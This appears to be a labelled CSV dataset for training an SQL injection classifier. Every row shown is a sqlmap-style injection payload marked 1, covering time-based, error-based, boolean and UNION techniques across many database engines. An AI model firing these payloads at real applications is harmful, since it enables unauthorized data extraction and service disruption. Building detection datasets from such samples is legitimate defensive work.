payload,label
"1' where 7125  =  7125 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
"1'  )   as noqp where 4042  =  4042 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
-9217 or 9323  =  9323#,1
1  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  9932  =  9932,1
"1' union all select null,null,null,null,null--",1
"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and ""%""  =  """,1
1'  )   as fxid where 5926  =  5926,1
1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and '%'  =  ',1
1'||  (  select 'ezse' from dual where 3821  =  3821,1
"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'snad' like 'snad",1
 (  select   (  case when   (  3592  =  3592  )   then 3592 else 3592*  (  select 3592 from information_schema.character_sets  )   end   )    ) ,1
1'   )    )     )   order by 1--,1
"-3719"" union all select 6609,6609,6609,6609#",1
"1""   )    )    as cduw where 4495  =  4495",1
1'   )    )    as gchn where 5856  =  5856,1
-2781   )    )     )   or 2573  =  5848--,1
"1%""   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""%""  =  """,1
"-5548' where 4477  =  4477 union all select 4477,4477,4477,4477,4477,4477,4477,4477,4477,4477--",1
select pg_sleep  (  5   )    )   ||',1
1   )    )    and 3228  =  7376#,1
"1  )   where 9645  =  9645 union all select null,null,null--",1
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
"1'   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'tfnb'  =  'tfnb",1
"select * from generate_series  (  5846,5846,case when   (  5846  =  5227  )   then 1 else 0 end  )   limit 1--",1
1'  )   rlike sleep  (  5  )   and   (  'boto'  =  'boto,1
"-6656""  )   union all select 3931#",1
"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""uosc""  =  ""uosc",1
1   )    )    as zoso where 3633  =  3633,1
"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1
1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  7015  =  7015,1
"1'||  (  select 'xuof' from dual where 8794  =  8794 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
1'   )    )    as cpwx where 5378  =  5378 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",1
1  )   where 7956  =  7956 or sleep  (  5  )  #,1
"-9774'   )    )     )   union all select 6954,6954,6954#",1
"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'ayjb' like 'ayjb",1
"1   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   8189  =  8189",1
"1%'   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   9333  =  9333",1
"1%'   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'mnod'  =  'mnod",1
"-7700%'  )   union all select 5660,5660,5660,5660,5660,5660,5660,5660,5660#",1
"1  )   as pcnd where 4589  =  4589 union all select null,null,null,null,null,null,null,null,null,null--",1
1'+  (  select yjyp where 9696  =  9696,1
1 where 8214  =  8214 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"-9574%'   )    )    union all select 5645,5645,5645,5645,5645,5645,5645--",1
"1  )   as khkv where 2944  =  2944 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
"-3933%""   )    )    or elt  (  8142  =  2978,2978  )   and    (    (   ""%""  =  """,1
select   (  case when   (  5322  =  6200  )   then 5322 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
"1%'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  '%'  =  '",1
"-4031""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""auhn""  =  ""auhn",1
"1 where 6100  =  6100 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,1
1'||  (  select 'jmhb' where 1794  =  1794 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""mkal"" like ""mkal",1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""nxvp""  =  ""nxvp",1
"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
1 where 8102  =  8102 and 9198  =  9198--,1
"1""   )    )     )   and   (  7758  =  4628  )  *4628 and    (    (     (  ""wzas""  =  ""wzas",1
"1'  )   where 1646  =  1646 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1'||  (  select 'pzoe' where 2977  =  2977 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1%""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1   )    )    as hqwy where 4433  =  4433 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
"1""  )   where 1699  =  1699 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
1  )   as dlkh where 6179  =  6179 and 9198  =  9198--,1
"1   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1%'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",1
"1' where 7464  =  7464 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
-6488' or 5164  =  9234,1
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""deeu"" like ""deeu",1
"1   )    )    as fmpr where 3103  =  3103 and elt  (  9970  =  9297,9297  )  --",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""khuw"" like ""khuw",1
"1  )   as yduh where 6481  =  6481 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""ksip"" like ""ksip",1
"1""  )   as mszg where 6184  =  6184 rlike sleep  (  5  )  --",1
"1%""   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""%""  =  """,1
"1'||  (  select 'ryyc' from dual where 5196  =  5196 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",1
"-2284%""   )    )    or 9323  =  9323#",1
"-1791' union all select 9316,9316,9316,9316,9316,9316,9316,9316--",1
"1"" rlike sleep  (  5  )  ",1
"1%"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,1
-4308'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'jmot'  =  'jmot,1
1'  )   as scnn where 9274  =  9274,1
"-9313%""  )   or 5971  =  4572#",1
"1%' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and '%'  =  '",1
1' waitfor delay '0:0:5' and 'jree'  =  'jree,1
1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'yaim'  =  'yaim,1
1%'   )    )    union all select null#,1
-4498  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  2902  =  2902,1
1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'pziy'  =  'pziy,1
1'||  (  select 'byxb' where 8351  =  8351 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ||',1
"1""   )    )    as wnzf where 3352  =  3352 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
1'+  (  select 'iqxn' where 1146  =  1146 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +',1
"1'   )    )    as kpdl where 4443  =  4443 union all select null,null,null,null,null,null--",1
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'jvll' like 'jvll",1
"1""   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""urqg""  =  ""urqg",1
-7779'  )   where 4976  =  4976 or 6872  =  6872--,1
"select pg_sleep  (  5  )   and ""zhsc""  =  ""zhsc",1
select   (  case when   (  7645  =  5921  )   then 7645 else 7645*  (  select 7645 from information_schema.character_sets  )   end  )  #,1
1'  )   as pxcd where 9754  =  9754 or sleep  (  5  )  --,1
"1   )    )    as prnp where 4932  =  4932 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ocfi'  =  'ocfi",1
"1""   )    )    as tjdz where 8656  =  8656 union all select null,null,null,null,null--",1
-5020%'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  '%'  =  ',1
"-3633'  )   where 3513  =  3513 union all select 3513,3513,3513,3513,3513,3513,3513,3513,3513,3513#",1
"1""   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  ""jref"" like ""jref",1
1%' and sleep  (  5  )  #,1
-4538'   )    )     )   or 3260  =  1236 and    (    (     (  'hpnd' like 'hpnd,1
"-4136'   )    )    as cczp where 7052  =  7052 union all select 7052,7052,7052,7052,7052,7052,7052,7052,7052,7052#",1
"1  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"-6407'  )   or elt  (  1631  =  4946,4946  )   and   (  'jpnz'  =  'jpnz",1
"1""   )    )    as ccjk where 1932  =  1932 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
1' where 4115  =  4115,1
"1""  )   as gjlv where 1983  =  1983 and sleep  (  5  )  #",1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual-- vykx",1
"-3860' union all select 3510,3510,3510#",1
1' in boolean mode  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
"-4527' union all select 7115,7115#",1
"-3672""   )    )    union all select 6093#",1
"1'   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'zeum'  =  'zeum",1
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""jzmg""  =  ""jzmg",1
"select count  (  *  )   from generate_series  (  1,5000000  )  ",1
"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",1
1%'   )    )     )   waitfor delay '0:0:5'--,1
1' where 4473  =  4473 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
"1  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  4959  =  4959",1
"1""  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""azpb""  =  ""azpb",1
"1%' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '%'  =  '",1
1%'   )    )     )   or sleep  (  5  )   and    (    (     (  '%'  =  ',1
1'||  (  select 'xtcb' where 5240  =  5240,1
"1'   )    )    as popm where 6594  =  6594 union all select null,null#",1
 (  select   (  case when   (  7018  =  7018  )   then 7018 else 7018*  (  select 7018 from master..sysdatabases  )   end   )    ) ,1
-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
"1""   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""nobt""  =  ""nobt",1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  ",1
"1,  (  select   (  case when   (  5777  =  5777  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1
"1""  )   where 5065  =  5065",1
"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kbkz'  =  'kbkz",1
-2806'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'rxzr'  =  'rxzr,1
"-9854%""   )    )     )   or 6455  =  3652",1
"1' where 4272  =  4272 union all select null,null,null,null#",1
"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",1
1  )   as tykp where 6851  =  6851,1
"1'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'dkra' like 'dkra",1
-3186 or 3867  =  9405,1
"1""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""quni""  =  ""quni",1
"1'   )    )    as jmnw where 6496  =  6496 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'obmu'  =  'obmu",1
"-4705' where 2029  =  2029 union all select 2029,2029,2029#",1
1 where 4153  =  4153 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
"1""  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1""  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""oxxi""  =  ""oxxi",1
1'||  (  select 'ozoj' where 1608  =  1608,1
"-5493""   )    )    union all select 8001,8001--",1
"1'   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1'   )    )     )   union all select null,null,null,null,null,null,null#",1
"1   )    )    union all select null,null,null,null,null,null,null,null,null,null#",1
"1""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""dksc""  =  ""dksc",1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""%""  =  """,1
1'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'ugoz'  =  'ugoz,1
-7207' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'obxw'  =  'obxw,1
1  )   as fhvb where 4008  =  4008,1
"-4798%'   )    )     )   union all select 3330,3330,3330#",1
"1%'  )   union all select null,null,null,null,null,null,null,null#",1
"-6496""   )    )     )   or 1471  =  5278 and    (    (     (  ""zkoj""  =  ""zkoj",1
"waitfor delay '0:0:5' and   (  ""%""  =  """,1
"1%""   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""%""  =  """,1
"1"" and make_set  (  8403  =  8403,8899  )   and ""fqxr"" like ""fqxr",1
"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",1
"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'drui' like 'drui",1
1'   )    )     )   rlike   (  select   (  case when   (  5524  =  9582  )   then 1 else 0x28 end   )    )    and    (    (     (  'okoj' like 'okoj,1
"-1337""  )   union all select 7508--",1
"-2722""  )   or 4907  =  8126#",1
"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""ardk"" like ""ardk",1
"1%""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""%""  =  """,1
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'wytg'  =  'wytg",1
"1%""  )   union all select null#",1
1'||  (  select 'gnil' from dual where 7552  =  7552 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  ||',1
1   )    )    as uvep where 6016  =  6016 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1
1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'vpqr'  =  'vpqr,1
"1',  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",1
"1""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""cowu"" like ""cowu",1
-5211 union all select 1754--,1
"1""  )   as bpmk where 6412  =  6412 union all select null,null,null,null#",1
"1   )    )    as mgvw where 4923  =  4923 union all select null,null,null,null--",1
"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'kqip' like 'kqip",1
"-9054""  )   as rgyu where 3792  =  3792 order by 1--",1
-6766'   )    )     )   or 3038  =  3038,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'yqrt' like 'yqrt",1
1  )   as vqdh where 1603  =  1603,1
"1'   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'yiem'  =  'yiem",1
"1%""  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1' in boolean mode  )   union all select null,null,null,null,null,null,null#",1
"1"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and ""cgpm"" like ""cgpm",1
"1"" where 5250  =  5250",1
"1'   )    )    as umah where 3781  =  3781 union all select null,null,null,null#",1
 (  select   (  case when   (  9525  =  9280  )   then 9525 else 9525*  (  select 9525 from master..sysdatabases  )   end   )    ) ,1
"-9315'   )    )     )   union all select 5057,5057,5057,5057,5057#",1
"-2962'   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'hkjo'  =  'hkjo",1
